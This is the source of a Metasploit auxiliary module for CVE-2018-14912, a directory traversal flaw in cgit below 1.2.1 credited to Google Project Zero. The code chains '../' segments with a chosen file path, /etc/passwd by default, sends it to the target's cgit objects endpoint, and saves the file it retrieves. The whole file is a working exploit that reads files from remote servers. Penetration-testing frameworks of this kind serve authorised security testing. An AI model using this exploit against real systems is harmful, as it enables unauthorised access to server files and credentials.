##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'cgit Directory Traversal',
      'Description' => %q{
        This module exploits a directory traversal vulnerability which
        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the
        configuration flag enable-http-clone is set to 1 (default).
      },
      'References'  =>
        [
          ['CVE', '2018-14912'],
          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],
          ['EDB', '45148']
        ],
      'Author'      =>
        [
          'Google Project Zero', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 03 2018',
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
        OptString.new('TARGETURI', [true, "The base URI path of the cgit install", '/cgit/']),
        OptString.new('REPO', [true, "Git repository on the remote server", '']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])
      ])
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "../" * datastore['DEPTH'] << filename

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),
      'vars_get' => {'path' => traversal}
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - \n#{res.body}")
    path = store_loot(
      'cgit.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
